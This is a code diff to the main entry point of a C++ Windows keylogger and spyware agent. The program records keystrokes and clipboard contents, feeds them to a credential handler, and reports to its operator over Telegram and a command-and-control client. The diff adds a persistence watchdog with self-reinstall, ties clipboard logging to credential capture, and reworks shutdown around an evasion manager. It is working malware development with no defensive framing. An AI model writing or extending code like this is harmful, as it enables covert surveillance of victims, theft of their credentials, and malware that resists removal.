@@ -44,6 +44,8 @@
 using namespace nuub;
 
 #ifdef _WIN32
+#define WIN32_LEAN_AND_MEAN
+#include <Windows.h>
 #include "infrastructure/keyboard/WindowsKeyListener.hpp"
 #include "infrastructure/keyboard/ClipboardMonitor.hpp"
 #include "infrastructure/system/WindowsPersistence.hpp"
@@ -127,8 +129,7 @@ int main(int argc, char* argv[]) {
         // Try to load config — auto-detect encrypted vs plaintext
         std::string json_content;
 
-        // First try with encryption password from env or hardcoded
-        // For now, try plaintext first, then encrypted
+        // Try to load config — auto-detect encrypted vs plaintext
         std::ifstream file(config_path, std::ios::binary);
         if (!file.is_open()) {
             throw std::runtime_error("Cannot open config file: " + config_path);
@@ -143,16 +144,15 @@ int main(int argc, char* argv[]) {
         if (raw_content.size() >= 4 &&
             raw_content[0] == 'N' && raw_content[1] == 'U' &&
             raw_content[2] == 'C' && raw_content[3] == 'F') {
-            // File is encrypted — try to decrypt with password from env
+            // File is encrypted — require password from env var
             const char* enc_pass = std::getenv("NUUB_CONFIG_KEY");
-            if (enc_pass) {
-                domain::ConfigEncryption crypto(enc_pass);
-                json_content = crypto.load(config_path);
-            } else {
-                // No key available — try common defaults
-                domain::ConfigEncryption crypto("default");
-                json_content = crypto.load(config_path);
+            if (!enc_pass) {
+                throw std::runtime_error(
+                    "Config file is encrypted but NUUB_CONFIG_KEY env var is not set. "
+                    "Set it to the encryption password or use a plaintext config.");
             }
+            domain::ConfigEncryption crypto(enc_pass);
+            json_content = crypto.load(config_path);
         } else {
             json_content = raw_content;
         }
@@ -323,7 +323,13 @@ int main(int argc, char* argv[]) {
     application::commands::CommandHandler command_handler(
         keystroke_service, reporting_service, telegram.reporter(),
         config.pc_identifier,
-        [&shutdown_flag]() { shutdown_flag = true; });
+        [&shutdown_flag]() {
+            shutdown_flag = true;
+#ifdef _WIN32
+            // PostQuitMessage is thread-safe; breaks pump_messages() loop
+            PostQuitMessage(0);
+#endif
+        });
 
     application::commands::MediaHandler media_handler(
         media_capture, telegram.reporter(), config.pc_identifier);
@@ -373,6 +379,9 @@ int main(int argc, char* argv[]) {
     });
     clipboard_monitor.start();
 
+    // Wire clipboard monitor to credential handler for cliplog/clipclear
+    credential_handler.set_clipboard_monitor(&clipboard_monitor);
+
     // Wire keyword alert callback
     keystroke_service.set_keyword_callback([&telegram](const std::string& msg) {
         telegram.reporter().send_message("KEYWORD ALERT: " + msg);
@@ -419,6 +428,10 @@ int main(int argc, char* argv[]) {
     activity_logger.register_event("STARTUP");
     persistence.start_anti_sleep();
 
+    // Initialize persistence watchdog and self-reinstall
+    persistence.init_self_reinstall();
+    persistence.start_watchdog();
+
     // Start keyboard listener
     key_listener.start();
 
@@ -427,23 +440,38 @@ int main(int argc, char* argv[]) {
         telegram.start();
     });
 
-    // Hidden window for shutdown detection
-    persistence.create_hidden_window([&]() {
-        spdlog::info("Shutdown signal received");
-        activity_logger.register_event("SHUTDOWN");
-        persistence.stop_anti_sleep();
-        key_listener.stop();
-        clipboard_monitor.stop();
-        telegram.stop();
-        if (c2_client) c2_client->stop();
-        spdlog::info("Agent shutting down");
-        std::exit(0);
+    // Hidden window for shutdown detection (WM_QUERYENDSESSION, WM_CLOSE, etc.)
+    // Cleanup happens after pump_messages() returns, so this just breaks the loop.
+#ifdef _WIN32
+    persistence.create_hidden_window([]() {
+        spdlog::info("System shutdown signal received");
+        PostQuitMessage(0);
     });
+#endif
 
     spdlog::info("Agent started. Waiting for Telegram commands...");
 
-    // Message pump (blocks until quit)
+    // Message pump (blocks until PostQuitMessage is called)
     persistence.pump_messages();
+
+    // ── Cleanup (runs after any shutdown path) ────────────────
+    spdlog::info("Cleaning up before exit...");
+    activity_logger.register_event("SHUTDOWN");
+#ifdef _WIN32
+    domain::EvasionManager::instance().request_shutdown();
+#endif
+    persistence.stop_anti_sleep();
+    key_listener.stop();
+    clipboard_monitor.stop();
+    telegram.stop();
+    if (telegram_thread.joinable()) {
+        telegram_thread.join();
+    }
+    if (c2_client) c2_client->stop();
+#ifdef _WIN32
+    domain::EvasionManager::instance().join_monitoring();
+#endif
+    spdlog::info("Agent stopped.");
 
     return 0;
 }
